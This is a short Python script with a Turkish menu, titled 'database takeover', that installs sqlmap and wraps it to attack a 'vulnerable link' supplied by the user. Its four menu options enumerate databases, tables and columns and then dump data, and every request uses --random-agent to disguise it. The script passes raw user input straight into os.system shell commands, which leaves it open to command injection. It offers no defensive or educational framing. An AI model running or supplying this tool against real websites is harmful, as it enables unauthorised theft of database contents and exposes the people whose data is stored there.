#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("apt-get install sqlmap")
os.system("clear")
os.system("figlet VERI TABANI ELE GECIRME")
print("""
Veri Tabani Ele Gecirme Programina Hos Geldiniz.

1) Sadece acikli linki biliyorum.
2) Acikli linki, veritabani adini biliyorum
3) Acikli linki, veritabani adini, tablo adini biliyorum
4) Acikli linki, veritabani adini, tablo adini, kolon adini biliyorum
""")

islemno = raw_input("Islem No Girin: ")

if(islemno == "1"):
	aciklilink = raw_input("Acikli linki girin: ")
	os.system("sqlmap -u " + aciklilink + " -dbs --random-agent")
elif(islemno == "2"):
	aciklilink = raw_input("Acikli linki girin: ")
	veritabani = raw_input("Veritabani adini girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
elif(islemno == "3"):
	aciklilink = raw_input("Acikli linki girin: ")
	veritabani = raw_input("Veritabani adini girin: ")
	tablo = raw_input("Tablo adini girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")
elif(islemno == "4"):
	aciklilink = raw_input("Acikli linki girin: ")
	veritabani = raw_input("Veritabani adini girin: ")
	tablo = raw_input("Tablo adini girin: ")
	colon = raw_input("Kolon adini girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
